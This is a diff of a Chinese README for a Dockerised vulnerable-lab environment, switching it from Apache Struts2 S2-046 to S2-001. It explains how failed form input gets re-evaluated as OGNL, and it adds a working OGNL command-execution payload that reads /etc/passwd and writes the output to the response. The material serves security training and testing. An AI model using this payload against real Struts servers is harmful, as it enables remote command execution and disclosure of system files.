@@ -1,21 +1,27 @@
-## Struts2_Jakarta_Plugin插件远程代码执行漏洞(S2-046) 环境
+## Struts2 S2-001 漏洞环境
 
 ### 漏洞信息
 
- * [S2-046 公告](https://cwiki.apache.org/confluence/display/WW/S2-046)
+ * [S2-001 公告](http://struts.apache.org/docs/s2-001.html)
+ 
+ ### 原理
+
+参考 [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)
+
+> 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
 
 ### 获取环境:
 
 1. 拉取镜像到本地
 
  ```
-$ docker pull medicean/vulapps:s_struts2_s2-046
+$ docker pull medicean/vulapps:s_struts2_s2-001
  ```
 
 2. 启动环境
 
  ```
-$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-046
+$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-001
  ```
  > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 
 
@@ -23,29 +29,14 @@ $ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-046
 
 访问 `http://你的 IP 地址:端口号/`
 
-#### PoC
+#### Poc
 
-> 本例中使用 [Struts2_Jakarta_Plugin插件远程代码执行漏洞(S2-046) ](http://www.bugscan.net/source/plugin/4787/template/)
+命令执行(命令加参数：new java.lang.String[]{"cat","/etc/passwd"})
 
+```
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+```
 
-1. 下载并安装 `BugScan SDK`
+![](S2-001-1.png)
 
- 详见 [BugScan 插件开发文档 - 环境配置](http://doc.bugscan.net/chapter1/1-1.html)
-
-2. 修改 `poc.py` 中地址为容器地址
-
- > 该漏洞无需配合上传表单使用
-
- ```
-if __name__ == '__main__':
-    from dummy import *
-    audit(assign(fingerprint.struts, 'http://127.0.0.1:8080/')[1])
-
- ```
-
-3. 运行 `poc.py`
-
- ```
-$ python poc.py
- ```
-
+![](S2-001-2.png)
